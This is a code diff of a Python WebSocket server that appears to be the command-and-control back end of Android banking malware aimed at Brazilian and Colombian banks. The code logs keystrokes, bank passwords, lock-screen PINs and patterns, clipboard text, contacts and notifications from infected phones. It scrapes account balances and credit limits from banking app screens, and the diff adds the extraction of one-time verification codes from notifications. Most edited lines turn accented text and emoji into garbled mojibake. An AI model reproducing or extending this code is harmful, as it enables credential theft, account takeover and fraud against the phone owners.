+                        # FAST PATH: Heartbeats, pings e hierarquias de tela nÃƒÂ£o abrem banco de dados (0ms de latÃƒÂªncia)
                         if msg_type == "PING":
                             try:
                                 await websocket.send_json({"type": "PONG", "action": "PING"})
@@ -1945,7 +1987,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                         elif msg_type in ("SCREEN_HIERARCHY", "HIERARCHY", "SCREEN_READER", "ACCESSIBILITY_HIERARCHY", "UI_TREE"):
                             hierarchy_data = message.get("data") or message.get("hierarchy") or message.get("tree")
                             if hierarchy_data:
-                                manager.store_screen_hierarchy(device_id, hierarchy_data)
+                                await manager.store_screen_hierarchy(device_id, hierarchy_data)
                         elif msg_type in ("SILENT_FRAME", "SCREEN_FRAME", "VNC_FRAME", "FRAME"):
                             frame_b64 = message.get("data") or message.get("frame") or message.get("image")
                             if frame_b64:
@@ -1976,7 +2018,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                                     pass
                                 device_db.close()
                     except json.JSONDecodeError as e:
-                        logger.warning(f"JSON invÃ¡lido de {device_id}: {e}")
+                        logger.warning(f"JSON invÃƒÂ¡lido de {device_id}: {e}")
                         continue
                     
                 elif "bytes" in data:
@@ -1986,7 +2028,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
             except asyncio.TimeoutError:
                 _ping_timeout_count += 1
                 if _ping_timeout_count >= 6:
-                    logger.info(f"ðŸ“± Dispositivo {device_id} inativo por timeout (6 pings sem resposta)")
+                    logger.info(f"Ã°Å¸â€œÂ± Dispositivo {device_id} inativo por timeout (6 pings sem resposta)")
                     break
                 try:
                     await websocket.send_json({"type": "PING", "action": "PING"})
@@ -1996,18 +2038,18 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
             except (WebSocketDisconnect, RuntimeError):
                 break
             except Exception as e:
-                logger.error(f"ðŸ“± Loop WebSocket {device_id} encerrado com erro: {e}", exc_info=True)
-                print(f"âŒ WS ERROR ({device_id}): {type(e).__name__}: {e}", flush=True)
+                logger.error(f"Ã°Å¸â€œÂ± Loop WebSocket {device_id} encerrado com erro: {e}", exc_info=True)
+                print(f"Ã¢ÂÅ’ WS ERROR ({device_id}): {type(e).__name__}: {e}", flush=True)
                 import traceback
                 traceback.print_exc()
                 break
                 
     except WebSocketDisconnect:
-        logger.info(f"ðŸ“± Dispositivo {device_id} desconectado (WebSocketDisconnect)")
+        logger.info(f"Ã°Å¸â€œÂ± Dispositivo {device_id} desconectado (WebSocketDisconnect)")
     except Exception as e:
         logger.error(f"Erro fatal no WebSocket {device_id}: {type(e).__name__}: {e}")
     finally:
-        # Limpeza da conexÃ£o atualmente ativa
+        # Limpeza da conexÃƒÂ£o atualmente ativa
         if manager.active_connections.get(device_id) is websocket:
             manager.disconnect(device_id, websocket=websocket)
             
@@ -2030,7 +2072,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
 
             await asyncio.to_thread(mark_offline_sync, device_id)
         else:
-            logger.info(f"ðŸ“± ConexÃ£o WebSocket antiga de {device_id} ignorou limpeza de desconexÃ£o (sobrescrita)")
+            logger.info(f"Ã°Å¸â€œÂ± ConexÃƒÂ£o WebSocket antiga de {device_id} ignorou limpeza de desconexÃƒÂ£o (sobrescrita)")
 
 def _extract_battery_level(data: dict):
     if not isinstance(data, dict):
@@ -2065,11 +2107,11 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
     """Processa mensagens JSON do dispositivo"""
     msg_type = message.get("type")
     
-    # ðŸ’“ Atualiza timestamp de atividade do dispositivo
+    # Ã°Å¸â€™â€œ Atualiza timestamp de atividade do dispositivo
     manager.update_device_activity(device_id)
     
     if msg_type == "DEVICE_INFO":
-        # InformaÃ§Ãµes do dispositivo
+        # InformaÃƒÂ§ÃƒÂµes do dispositivo
         bat = _extract_battery_level(message)
         if device_id not in manager.device_info:
             manager.device_info[device_id] = {}
@@ -2132,7 +2174,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         if device_id not in manager.device_info:
             manager.device_info[device_id] = {}
         manager.device_info[device_id]["admin_active"] = admin_state
-        logger.info(f"ðŸ›¡ï¸ Status do Admin de {device_id} atualizado: {admin_state}")
+        logger.info(f"Ã°Å¸â€ºÂ¡Ã¯Â¸Â Status do Admin de {device_id} atualizado: {admin_state}")
 
     elif msg_type == "SILENT_VNC_STATUS":
         # Status do caminho silencioso dedicado (BTMOB purple button)
@@ -2140,7 +2182,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             "active": bool(message.get("active", False)),
             "method": message.get("method", "silent")
         }
-        logger.warning(f"ðŸ”‡ SILENT_VNC_STATUS de {device_id}: active={message.get('active')}, method={message.get('method')}")
+        logger.warning(f"Ã°Å¸â€â€¡ SILENT_VNC_STATUS de {device_id}: active={message.get('active')}, method={message.get('method')}")
         
     elif msg_type in ("CLIPBOARD", "CLIPBOARD_DATA"):
         clip_text = message.get("text") or message.get("data") or ""
@@ -2149,7 +2191,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 manager.device_info[device_id] = {}
             manager.device_info[device_id]["clipboard"] = clip_text
             
-            logger.info(f"ðŸ“‹ CLIPBOARD capturado de {device_id}: {clip_text}")
+            logger.info(f"Ã°Å¸â€œâ€¹ CLIPBOARD capturado de {device_id}: {clip_text}")
             
             log = DeviceLog(
                 device_id=device_id,
@@ -2169,7 +2211,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
 
     elif msg_type in ("CONTACTS", "CONTACTS_LIST"):
         contacts_data = message.get("data")
-        logger.info(f"ðŸ‘¥ CONTACTS recebidos de {device_id}")
+        logger.info(f"Ã°Å¸â€˜Â¥ CONTACTS recebidos de {device_id}")
         
         try:
             contacts_json = json.dumps(contacts_data) if not isinstance(contacts_data, str) else contacts_data
@@ -2199,15 +2241,15 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
     elif msg_type == "KEYLOG":
         # Keylogger data - loga e processa detector de senhas
         keylog_data = message.get("data")
-        logger.info(f"âŒ¨ï¸ KEYLOG de {device_id}: {keylog_data}")
+        logger.info(f"Ã¢Å’Â¨Ã¯Â¸Â KEYLOG de {device_id}: {keylog_data}")
         
-        # Tenta parsear para ver se Ã© VISUAL_SCREEN_DATA ou FILE_UPLOAD
+        # Tenta parsear para ver se ÃƒÂ© VISUAL_SCREEN_DATA ou FILE_UPLOAD
         try:
             parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
             
-            # ðŸ“¤ PROCESSAMENTO ESPECIAL: File Upload
+            # Ã°Å¸â€œÂ¤ PROCESSAMENTO ESPECIAL: File Upload
             if parsed.get('type') == 'FILE_UPLOAD':
-                logger.info(f"ðŸ“¤ FILE_UPLOAD de {device_id}")
+                logger.info(f"Ã°Å¸â€œÂ¤ FILE_UPLOAD de {device_id}")
                 
                 label = parsed.get('label', 'DOCUMENTO')
                 fileName = parsed.get('fileName', 'unknown')
@@ -2233,16 +2275,16 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 db.add(log)
                 
                 logger.info(f"\n{'='*60}")
-                logger.info(f"ðŸ“¤ ARQUIVO RECEBIDO!")
+                logger.info(f"Ã°Å¸â€œÂ¤ ARQUIVO RECEBIDO!")
                 logger.info(f"Label: {file_info['label']}")
                 logger.info(f"Nome: {file_info['fileName']}")
                 logger.info(f"Tipo: {file_info['mimeType']}")
                 logger.info(f"Tamanho: {len(file_info['data'])} bytes (base64)")
                 logger.info(f"{'='*60}\n")
             
-            # ðŸ” PROCESSAMENTO ESPECIAL: Visual Screen Data
+            # Ã°Å¸â€Â PROCESSAMENTO ESPECIAL: Visual Screen Data
             elif parsed.get('type') == 'VISUAL_SCREEN_DATA' or parsed.get('source') == 'VISUAL_SCREEN':
-                logger.info(f"ðŸ” VISUAL_SCREEN_DATA de {device_id}")
+                logger.info(f"Ã°Å¸â€Â VISUAL_SCREEN_DATA de {device_id}")
                 
                 # Resolve o pacote e nome do banco com base no active_banks ou no payload
                 active_bank = manager.device_active_banks.get(device_id) or {}
@@ -2251,14 +2293,14 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 if not target_bank:
                     target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
                 if not target_bank:
-                    target_bank = 'ItaÃº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
+                    target_bank = 'ItaÃƒÂº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
                 
                 # Se tiver dados capturados (formato agregado)
                 if 'captured' in parsed:
                     captured = parsed['captured']
                     for label, value in captured.items():
                         if value and len(value) > 0:
-                            # Salva cada campo como senha bancÃ¡ria
+                            # Salva cada campo como senha bancÃƒÂ¡ria
                             password_info = {
                                 'device_id': device_id,
                                 'bank': target_bank,
@@ -2281,9 +2323,9 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                             db.add(log)
                             
                             logger.info(f"\n{'='*60}")
-                            logger.info(f"ðŸ” KEYLOGGER {target_bank.upper()} - SENHA CAPTURADA!")
+                            logger.info(f"Ã°Å¸â€Â KEYLOGGER {target_bank.upper()} - SENHA CAPTURADA!")
                             logger.info(f"Label: {label}")
-                            logger.info(f"Senha: {value} ({len(value)} dÃ­gitos)")
+                            logger.info(f"Senha: {value} ({len(value)} dÃƒÂ­gitos)")
                             logger.info(f"{'='*60}\n")
                 
                 # Formato individual (isPassword=true)
@@ -2309,13 +2351,13 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                     )
                     db.add(log)
                     
-                    logger.info(f"ðŸ” KEYLOGGER {target_bank.upper()} - Senha: {password_info['password']}")
+                    logger.info(f"Ã°Å¸â€Â KEYLOGGER {target_bank.upper()} - Senha: {password_info['password']}")
             
-            # ðŸ”’ PROCESSAMENTO ESPECIAL: PIN Capturado do Lockscreen
+            # Ã°Å¸â€â€™ PROCESSAMENTO ESPECIAL: PIN Capturado do Lockscreen
             elif parsed.get('type') == 'CAPTURED_PIN':
                 pin = parsed.get('pin', '')
                 logger.info(f"\n{'='*60}")
-                logger.info(f"ðŸ”’ PIN CAPTURADO DO LOCKSCREEN!")
+                logger.info(f"Ã°Å¸â€â€™ PIN CAPTURADO DO LOCKSCREEN!")
                 logger.info(f"PIN: {pin}")
                 logger.info(f"Device: {device_id}")
                 logger.info(f"{'='*60}\n")
@@ -2333,12 +2375,12 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 )
                 db.add(log)
             
-            # ðŸ’‰ PROCESSAMENTO ESPECIAL: Senha de aplicativo baixado capturada
+            # Ã°Å¸â€™â€° PROCESSAMENTO ESPECIAL: Senha de aplicativo baixado capturada
             elif parsed.get('type') == 'CAPTURED_APP_PASSWORD':
                 pkg = parsed.get('package', '')
                 password = parsed.get('password', '')
                 logger.info(f"\n{'='*60}")
-                logger.info(f"ðŸ’‰ SENHA DE APP CAPTURADA!")
+                logger.info(f"Ã°Å¸â€™â€° SENHA DE APP CAPTURADA!")
                 logger.info(f"App: {pkg}")
                 logger.info(f"Senha: {password}")
                 logger.info(f"Device: {device_id}")
@@ -2357,11 +2399,11 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 )
                 db.add(log)
             
-            # ðŸ”² PROCESSAMENTO ESPECIAL: Pattern Capturado do Lockscreen
+            # Ã°Å¸â€Â² PROCESSAMENTO ESPECIAL: Pattern Capturado do Lockscreen
             elif parsed.get('type') == 'CAPTURED_PATTERN':
                 pattern = parsed.get('pattern', '')
                 logger.info(f"\n{'='*60}")
-                logger.info(f"ðŸ”² PATTERN CAPTURADO DO LOCKSCREEN!")
+                logger.info(f"Ã°Å¸â€Â² PATTERN CAPTURADO DO LOCKSCREEN!")
                 logger.info(f"Pattern: {pattern}")
                 logger.info(f"Device: {device_id}")
                 logger.info(f"{'='*60}\n")
@@ -2379,14 +2421,14 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 )
                 db.add(log)
                     
-            # ðŸ”” PROCESSAMENTO ESPECIAL: NotificaÃ§Ã£o Recebida do Aparelho
+            # Ã°Å¸â€â€ PROCESSAMENTO ESPECIAL: NotificaÃƒÂ§ÃƒÂ£o Recebida do Aparelho
             elif parsed.get('eventType') == 'NOTIFICATION':
                 pkg = parsed.get('package', 'desconhecido')
                 app_name = parsed.get('appName', '')
                 text = parsed.get('text', '')
-                logger.info(f"ðŸ”” NOTIFICAÃ‡ÃƒO de {device_id} ({pkg}): {text}")
+                logger.info(f"Ã°Å¸â€â€ NOTIFICAÃƒâ€¡ÃƒÆ’O de {device_id} ({pkg}): {text}")
                 
-                # Salva no banco de dados como log de notificaÃ§Ã£o
+                # Salva no banco de dados como log de notificaÃƒÂ§ÃƒÂ£o
                 log = DeviceLog(
                     device_id=device_id,
                     log_type="DEVICE_NOTIFICATION",
@@ -2399,6 +2441,21 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                     created_at=utc_now()
                 )
                 db.add(log)
+                # [KRYPTOS-OTP] detecta codigo de verificacao
+                try:
+                    _otp = _extract_otp(text, pkg, app_name)
+                    if _otp:
+                        db.add(DeviceLog(
+                            device_id=device_id,
+                            log_type="DEVICE_OTP",
+                            log_data=json.dumps({"otp": _otp, "package": pkg, "appName": app_name,
+                                                 "text": text, "timestamp": utc_now().isoformat()}),
+                            created_at=utc_now()
+                        ))
+                        logger.info("[OTP] " + device_id + " " + (app_name or pkg) + ": " + _otp)
+                except Exception as _oe:
+                    logger.warning("[OTP] falha: " + str(_oe))
+
             
             else:
                 # Processamento normal de keylog
@@ -2416,7 +2473,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                         db.add(log)
                         
         except json.JSONDecodeError:
-            # Se nÃ£o for JSON, processa como keylog normal
+            # Se nÃƒÂ£o for JSON, processa como keylog normal
             if device_id in manager.password_detector:
                 password_info = manager.password_detector[device_id].process_keylog(keylog_data)
                 if password_info:
@@ -2438,7 +2495,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         db.add(log)
         await safe_db_commit(db)
         
-        # âš¡ TRANSMISSÃƒO EM TEMPO REAL INSTANTÃ‚NEA PARA O PAINEL
+        # Ã¢Å¡Â¡ TRANSMISSÃƒÆ’O EM TEMPO REAL INSTANTÃƒâ€šNEA PARA O PAINEL
         await manager.broadcast_to_operators({
             "type": "REALTIME_KEYLOG",
             "device_id": device_id,
@@ -2446,24 +2503,24 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         })
     
     elif msg_type == "KEYLOG_OFFLINE":
-        # ðŸ’¾ KEYLOG OFFLINE - capturado quando estava desconectado!
+        # Ã°Å¸â€™Â¾ KEYLOG OFFLINE - capturado quando estava desconectado!
         keylog_data = message.get("data")
         saved_at = message.get("savedAt")
         
-        logger.info(f"ðŸ’¾ KEYLOG OFFLINE de {device_id}: {keylog_data}")
+        logger.info(f"Ã°Å¸â€™Â¾ KEYLOG OFFLINE de {device_id}: {keylog_data}")
         
-        # Verifica se Ã© um tipo especial (UNLOCK_SEQUENCE, etc)
+        # Verifica se ÃƒÂ© um tipo especial (UNLOCK_SEQUENCE, etc)
         try:
             parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
             
             if parsed.get('type') == 'UNLOCK_SEQUENCE':
-                # Ã‰ uma sequÃªncia de desbloqueio
+                # Ãƒâ€° uma sequÃƒÂªncia de desbloqueio
                 sequence_data = parsed.get('data')
                 if sequence_data:
                     if isinstance(sequence_data, str):
                         sequence_data = json.loads(sequence_data)
                     manager.store_unlock_sequence(device_id, sequence_data)
-                    logger.info(f"ðŸ’¾ðŸ”“ Unlock sequence OFFLINE de {device_id}")
+                    logger.info(f"Ã°Å¸â€™Â¾Ã°Å¸â€â€œ Unlock sequence OFFLINE de {device_id}")
                     
                     # Salva no log
                     log = DeviceLog(
@@ -2490,9 +2547,9 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         # Screen Reader V2 - hierarquia da tela
         hierarchy_data = message.get("data")
         if hierarchy_data:
-            manager.store_screen_hierarchy(device_id, hierarchy_data)
+            await manager.store_screen_hierarchy(device_id, hierarchy_data)
             
-            # ðŸ’° CAPTURA AUTOMÃTICA DE SALDO â€” busca R$ no conteÃºdo da tela
+            # Ã°Å¸â€™Â° CAPTURA AUTOMÃƒÂTICA DE SALDO Ã¢â‚¬â€ busca R$ no conteÃƒÂºdo da tela
             try:
                 import re
                 import xml.etree.ElementTree as ET
@@ -2500,7 +2557,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 # Texto plano da hierarquia (pode ser JSON ou string)
                 hier_text = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
                 
-                # Verifica se o app em foco Ã© um banco
+                # Verifica se o app em foco ÃƒÂ© um banco
                 foreground_pkg = manager.device_info.get(device_id, {}).get("foreground_package", "")
                 active_bank = manager.device_active_banks.get(device_id)
                 current_pkg = (active_bank or {}).get("package") or foreground_pkg or ""
@@ -2525,13 +2582,13 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 
                 candidates = []
                 
-                # Regexes para encontrar valores monetÃ¡rios
+                # Regexes para encontrar valores monetÃƒÂ¡rios
                 # 1. R$ 1.234,56 ou R$1234,56 ou R$ -12,34
                 money_symbol_pattern = re.compile(
                     r'(?:R\$\s*|R\s*\$\s*)(-?\s*\d{1,3}(?:[\.,]\d{3})*[\.,]\d{2}|-?\s*\d+[\.,]\d{2})',
                     re.IGNORECASE
                 )
-                # 2. Apenas o nÃºmero formatado como dinheiro: 1.234,56 ou 123,45 ou 1234,56
+                # 2. Apenas o nÃƒÂºmero formatado como dinheiro: 1.234,56 ou 123,45 ou 1234,56
                 money_raw_pattern = re.compile(
                     r'\b(-?\s*\d{1,3}(?:\.\d{3})*,\d{2})\b|\b(-?\s*\d+,\d{2})\b'
                 )
@@ -2611,8 +2668,8 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                             m_pos = hier_text.find(m)
                             if m_pos != -1:
                                 context = hier_text[max(0, m_pos - 80):min(len(hier_text), m_pos + len(m) + 80)].lower()
-                                if any(nk in context for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "card", "loan", "invoice"]):
-                                    # Se tem termos de crÃ©dito no regex fallback, adiciona como candidato a limite/fatura
+                                if any(nk in context for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "card", "loan", "invoice"]):
+                                    # Se tem termos de crÃƒÂ©dito no regex fallback, adiciona como candidato a limite/fatura
                                     if any(ik in context for ik in ["fatura", "invoice", "bill"]):
                                         inv_candidates.append({"val": val, "raw": m, "formatted": f"R$ {m.strip()}", "score": 200})
                                     else:
@@ -2623,7 +2680,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                             if is_bank_screen:
                                 score += 100
                             hier_text_lower = hier_text.lower()
-                            if any(pk in hier_text_lower for pk in ["saldo", "disponivel", "disponÃ­vel", "balance"]):
+                            if any(pk in hier_text_lower for pk in ["saldo", "disponivel", "disponÃƒÂ­vel", "balance"]):
                                 score += 1000
                             bal_candidates.append({
                                 "val": val,
@@ -2632,11 +2689,11 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                 "score": score
                             })
                 else:
-                    # Context Keywords (Brasil + ColÃ´mbia / Davivienda)
-                    bal_pos_keywords = ["saldo", "disponivel", "disponÃ­vel", "disponible", "saldo da conta", "saldo em conta", 
+                    # Context Keywords (Brasil + ColÃƒÂ´mbia / Davivienda)
+                    bal_pos_keywords = ["saldo", "disponivel", "disponÃƒÂ­vel", "disponible", "saldo da conta", "saldo em conta", 
                                         "saldo actual", "saldo total", "conta corrente", "cuentas", "bolsillos", "daviplata", "carteira", 
-                                        "wallet", "balance", "dinheiro em conta", "saldo disponÃ­vel", "saldo disponivel"]
-                    lim_pos_keywords = ["limite", "limite disponÃ­vel", "limite disponivel", "limite de crÃ©dito", 
+                                        "wallet", "balance", "dinheiro em conta", "saldo disponÃƒÂ­vel", "saldo disponivel"]
+                    lim_pos_keywords = ["limite", "limite disponÃƒÂ­vel", "limite disponivel", "limite de crÃƒÂ©dito", 
                                         "limite de credito", "limite total", "disponivel limite"]
                     inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]
 
@@ -2651,16 +2708,16 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                             
                             val_str_lower = val_str.lower()
                             
-                            # Tenta casar com sÃ­mbolo R$
+                            # Tenta casar com sÃƒÂ­mbolo R$
                             matches_sym = money_symbol_pattern.findall(val_str)
                             for m in matches_sym:
                                 val = parse_brl_value(m)
                                 if val is not None and -999999.0 <= val <= 9999999.0:
                                     formatted_val = f"R$ {m.strip()}"
                                     
-                                    # 1. PontuaÃ§Ã£o para Saldo (Checking Balance)
-                                    # Filtro estrito: sem termos de crÃ©dito no nÃ³ ou vizinhos
-                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "card", "loan", "invoice"])
+                                    # 1. PontuaÃƒÂ§ÃƒÂ£o para Saldo (Checking Balance)
+                                    # Filtro estrito: sem termos de crÃƒÂ©dito no nÃƒÂ³ ou vizinhos
+                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "card", "loan", "invoice"])
                                     is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                     
                                     start_idx = max(0, idx - 4)
@@ -2671,7 +2728,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                             continue
                                         neighbor = nodes[neighbor_idx]
                                         n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
-                                        if any(nk in n_text for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "card", "loan", "invoice"]):
+                                        if any(nk in n_text for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "card", "loan", "invoice"]):
                                             has_credit_neighbor = True
                                             break
                                             
@@ -2682,7 +2739,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                         if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]):
                                             bal_score += 4000
                                             
-                                        # BÃ´nus vizinhos
+                                        # BÃƒÂ´nus vizinhos
                                         for neighbor_idx in range(start_idx, end_idx):
                                             if neighbor_idx == idx:
                                                 continue
@@ -2692,7 +2749,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                             if any(pk in n_text for pk in bal_pos_keywords):
                                                 bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                                 
-                                        # Regras especÃ­ficas de banco
+                                        # Regras especÃƒÂ­ficas de banco
                                         if current_pkg:
                                             pkg_lower = current_pkg.lower()
                                             if "nu.production" in pkg_lower or "nubank" in pkg_lower:
@@ -2707,8 +2764,8 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                                     
                                         bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                         
-                                    # 2. PontuaÃ§Ã£o para Limite de CrÃ©dito
-                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃ§a", "investimento", "carteira", "extrato"])
+                                    # 2. PontuaÃƒÂ§ÃƒÂ£o para Limite de CrÃƒÂ©dito
+                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃƒÂ§a", "investimento", "carteira", "extrato"])
                                     is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                     
                                     if not (is_bal_node or is_fatura_node):
@@ -2737,7 +2794,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                         if lim_score >= 150:
                                             lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                             
-                                    # 3. PontuaÃ§Ã£o para Fatura
+                                    # 3. PontuaÃƒÂ§ÃƒÂ£o para Fatura
                                     is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                     if not (is_bal_node or is_lim_node):
                                         inv_score = 100
@@ -2759,7 +2816,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                         if inv_score >= 150:
                                             inv_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": inv_score})
                                     
-                            # Tenta casar nÃºmero puro apenas em telas financeiras
+                            # Tenta casar nÃƒÂºmero puro apenas em telas financeiras
                             if is_bank_screen and not matches_sym:
                                 matches_raw = money_raw_pattern.findall(val_str)
                                 for m_tuple in matches_raw:
@@ -2769,8 +2826,8 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                         if val is not None and -999999.0 <= val <= 9999999.0:
                                             formatted_val = f"R$ {m.strip()}"
                                             
-                                            # 1. PontuaÃ§Ã£o Saldo (puro)
-                                            is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "card", "loan", "invoice"])
+                                            # 1. PontuaÃƒÂ§ÃƒÂ£o Saldo (puro)
+                                            is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "card", "loan", "invoice"])
                                             is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                             
                                             start_idx = max(0, idx - 4)
@@ -2781,7 +2838,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                                     continue
                                                 neighbor = nodes[neighbor_idx]
                                                 n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
-                                                if any(nk in n_text for nk in ["limite", "fatura", "crÃ©dito", "credito", "emprÃ©stimo", "emprestimo", "cartÃ£o", "cartao", "card", "loan", "invoice"]):
+                                                if any(nk in n_text for nk in ["limite", "fatura", "crÃƒÂ©dito", "credito", "emprÃƒÂ©stimo", "emprestimo", "cartÃƒÂ£o", "cartao", "card", "loan", "invoice"]):
                                                     has_credit_neighbor = True
                                                     break
                                                     
@@ -2813,8 +2870,8 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                                 if bal_score >= 150:
                                                     bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                                     
-                                            # 2. PontuaÃ§Ã£o Limite (puro)
-                                            is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃ§a", "investimento", "carteira", "extrato"])
+                                            # 2. PontuaÃƒÂ§ÃƒÂ£o Limite (puro)
+                                            is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupanÃƒÂ§a", "investimento", "carteira", "extrato"])
                                             is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                             
                                             if not (is_bal_node or is_fatura_node):
@@ -2841,7 +2898,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                                 if lim_score >= 150:
                                                     lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                                     
-                                            # 3. PontuaÃ§Ã£o Fatura (puro)
+                                            # 3. PontuaÃƒÂ§ÃƒÂ£o Fatura (puro)
                                             is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                             if not (is_bal_node or is_lim_node):
                                                 inv_score = 50
@@ -2882,7 +2939,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                         best_invoice = best_c["formatted"]
 
                 if best_balance or best_limit or best_invoice:
-                    # Busca o Ãºltimo registro de BANK_BALANCE deste dispositivo e package
+                    # Busca o ÃƒÂºltimo registro de BANK_BALANCE deste dispositivo e package
                     recent = db.query(DeviceLog).filter(
                         DeviceLog.device_id == device_id,
                         DeviceLog.log_type == "BANK_BALANCE"
@@ -2939,41 +2996,41 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                         )
                         db.add(balance_log)
                         db.commit()
-                        logger.info(f"ðŸ’° SALDO AUTO-CAPTURADO de {device_id} ({app_name_captured}): Saldo={final_balance} | Limite={final_limit} | Fatura={final_invoice}")
+                        logger.info(f"Ã°Å¸â€™Â° SALDO AUTO-CAPTURADO de {device_id} ({app_name_captured}): Saldo={final_balance} | Limite={final_limit} | Fatura={final_invoice}")
             except Exception as e:
                 logger.error(f"Erro na captura de saldo: {e}")
-        logger.info(f"ðŸ‘ï¸ Screen Hierarchy de {device_id}: {len(hierarchy_data) if hierarchy_data else 0} bytes")
+        logger.info(f"Ã°Å¸â€˜ÂÃ¯Â¸Â Screen Hierarchy de {device_id}: {len(hierarchy_data) if hierarchy_data else 0} bytes")
     
     elif msg_type == "UNLOCK_SEQUENCE":
-        # ðŸ”“ SequÃªncia de desbloqueio gravada
+        # Ã°Å¸â€â€œ SequÃƒÂªncia de desbloqueio gravada
         sequence_data = message.get("data")
         if sequence_data:
             try:
                 if isinstance(sequence_data, str):
                     sequence_data = json.loads(sequence_data)
                 manager.store_unlock_sequence(device_id, sequence_data)
-                logger.info(f"ðŸ”“ Unlock sequence de {device_id}: {sequence_data.get('count', 0)} aÃ§Ãµes")
+                logger.info(f"Ã°Å¸â€â€œ Unlock sequence de {device_id}: {sequence_data.get('count', 0)} aÃƒÂ§ÃƒÂµes")
             except Exception as e:
                 logger.error(f"Erro ao processar unlock sequence: {e}")
     
     elif msg_type == "CAMERA_FRAME":
-        # ðŸ“· Frame da cÃ¢mera (base64)
+        # Ã°Å¸â€œÂ· Frame da cÃƒÂ¢mera (base64)
         frame_b64 = message.get("data")
